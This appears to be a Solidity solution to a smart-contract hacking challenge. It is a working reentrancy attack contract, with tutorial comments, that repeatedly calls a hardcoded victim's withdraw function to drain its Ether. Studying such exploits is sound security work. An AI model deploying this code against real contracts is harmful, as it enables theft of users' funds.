// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* We should make the contract ownable because in a real-world scenario you will not want
others to use your attacking contract. It is not necessary for this solution though.
The Ownable contract of OpenZeppelin will atribute ownership to the deployer and comes 
with a nice "onlyOwner()" modifier for us to use in protected functions.

The target contract has a reentrancy flaw. Whenever a target contract sends Ether before
updating state it can fall victim of a reentrancy attack. To make a reentrancy attack we
need a contract to call the function in the victim that sends Ether before updating state
and that contract should have a receive function that calls the function again, effectively
creating a loop to drain the victim's Ether before it gets the chance to update state.

I added the victim interface at the bottom of the contract. You can put it anywhere though.
You may also import the contract if you have the code.

The challenge here it's to stop the reentrancy before the transaction revert. It can revert
either by the victim having no funds to send or because there is no more gas left. To deal
with those situations you got two options: you either check the victim balance and the 
gas left every iteration before sending the withdraw call or you set up a counter to stop
after an "x" amount of times. I tryied to use balance and gasleft with a lot of trial and
error and got to a safe 10000 gas left. You may experiment and reach a more efficient way.*/

contract ReentrancyAttack{

  // First we need to instantiate the victim contract
  Victim victim = Victim(0xE0442Dd326F66c05230476C95DeE6a2108968521);

  function attack() public payable {
    victim.donate{value: msg.value}(address(this));
    victim.withdraw(msg.value);
  }

  receive() external payable{
    if ((address(victim).balance >= msg.value) && (gasleft() > 10000)){
      victim.withdraw(msg.value);
    }
  }
}

/* The easiest way to build an interface for another contract is to just copy the functions
"header" that you are going to use. We need the donate to have a balance and pass the withdraw
check, we also need the balanceOf so we can check the contract balance before calling the
function again so it doesn't revert.*/

interface Victim {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
}

